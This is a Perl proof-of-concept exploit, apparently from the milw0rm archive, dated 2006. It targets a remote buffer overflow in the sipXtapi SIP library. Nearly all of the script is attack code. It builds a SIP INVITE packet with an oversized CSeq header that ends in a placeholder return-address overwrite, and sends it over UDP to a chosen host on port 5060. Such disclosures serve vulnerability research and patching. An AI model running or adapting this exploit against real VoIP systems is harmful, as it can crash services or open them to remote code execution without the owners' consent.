#!/usr/bin/perl
# PoC Exploit By mthumann@ernw.de
# Remote Buffer Overflow in sipXtapi

use IO::Socket;
#use strict;


print "sipXtapi Exploit by Michael Thumann \n\n";

if (not $ARGV[0]) {
        print "Usage: sipx.pl <host>\n";
exit;}

$target=$ARGV[0];
my $source ="127.0.0.1";
my $target_port = 5060;
my $user ="bad";
my $eip="\x41\x41\x41\x41";
my $cseq =
"\x31\x31\x35\x37\x39\x32\x30\x38".
"\x39\x32\x33\x37\x33\x31\x36\x31".
"\x39\x35\x34\x32\x33\x35\x37\x30".
$eip;
my $packet =<<END;
INVITE sip:user\@$source SIP/2.0\r
To: <sip:$target:$target_port>\r
Via: SIP/2.0/UDP $target:3277\r
From: "moz"<sip:$target:3277>\r
Call-ID: 3121$target\r
CSeq: $cseq\r
Max-Forwards: 70\r
Contact: <sip:$source:5059>\r
\r
END

print "Sending Packet to: " . $target . "\n\n";
socket(PING, PF_INET, SOCK_DGRAM, getprotobyname("udp"));
my $ipaddr = inet_aton($target);
my $sendto = sockaddr_in($target_port,$ipaddr);
send(PING, $packet, 0, $sendto) == length($packet) or die "cannot send to $target : $target_port : $!\n";
print "Done.\n";

#EoF

# milw0rm.com [2006-07-10]